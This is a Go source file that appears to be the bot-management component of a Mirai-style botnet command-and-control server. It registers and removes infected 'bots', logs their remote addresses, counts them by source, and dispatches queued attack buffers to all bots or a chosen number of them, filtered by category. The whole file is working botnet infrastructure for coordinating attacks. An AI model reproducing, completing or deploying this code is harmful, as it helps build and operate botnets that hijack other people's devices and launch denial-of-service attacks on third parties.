package main

import (
	"fmt"
	"log"
	"math/rand"
	"sync"
	"time"
)

type AttackSend struct {
	buf     []byte
	count   int
	botCata string
}

type ClientList struct {
	uid         int
	count       int
	clients     map[int]*Bot
	addQueue    chan *Bot
	delQueue    chan *Bot
	atkQueue    chan *AttackSend
	totalCount  chan int
	cntView     chan int
	distViewReq chan int
	distViewRes chan map[string]int
	cntMutex    *sync.Mutex
}

func NewClientList() *ClientList {
	c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
	go c.worker()
	go c.fastCountWorker()
	return c
}

func (this *ClientList) Count() int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()

	this.cntView <- 0
	return <-this.cntView
}

func (this *ClientList) Distribution() map[string]int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	this.distViewReq <- 0
	return <-this.distViewRes
}

func (this *ClientList) AddClient(c *Bot) (int, int) {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()

	oldCount := this.count
	this.uid++
	c.uid = this.uid
	this.clients[c.uid] = c
	this.count++
	log.Println(LogInfo + fmt.Sprintf("Added %d, %s, %s", c.version, c.source, c.conn.RemoteAddr()))
	if len(c.source) < 1 {
		c.source = "undefined"
	}
	return oldCount, this.count
}

func (this *ClientList) DelClient(c *Bot) (int, int) {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()

	oldCount := this.count
	delete(this.clients, c.uid)
	this.count--
	log.Println(LogInfo + fmt.Sprintf("Deleted %d, %s, %s", c.version, c.source, c.conn.RemoteAddr()))
	return oldCount, this.count
}

func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
	attack := &AttackSend{buf, maxbots, botCata}
	this.atkQueue <- attack
}

func (this *ClientList) fastCountWorker() {
	for {
		select {
		case delta := <-this.totalCount:
			this.count += delta
			break
		case <-this.cntView:
			this.cntView <- this.count
			break
		}
	}
}

func (this *ClientList) worker() {
	rand.Seed(time.Now().UTC().UnixNano())

	for {
		select {
		case add := <-this.addQueue:
			_, _ = this.AddClient(add)
			fmt.Printf("Added client %d - %s - %s\n", add.version, add.source, add.conn.RemoteAddr())
			break
		case del := <-this.delQueue:
			_, _ = this.DelClient(del)
			fmt.Printf("Deleted client %d - %s - %s\n", del.version, del.source, del.conn.RemoteAddr())
			break
		case atk := <-this.atkQueue:
			if atk.count == -1 {
				for _, v := range this.clients {
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf)
					}
				}
			} else {
				var count int
				for _, v := range this.clients {
					if count > atk.count {
						break
					}
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf)
						count++
					}
				}
			}
			break
		case <-this.cntView:
			this.cntView <- this.count
			break
		case <-this.distViewReq:
			res := make(map[string]int)
			for _, v := range this.clients {
				if ok, _ := res[v.source]; ok > 0 {
					res[v.source]++
				} else {
					res[v.source] = 1
				}
			}
			this.distViewRes <- res
		}
	}
}
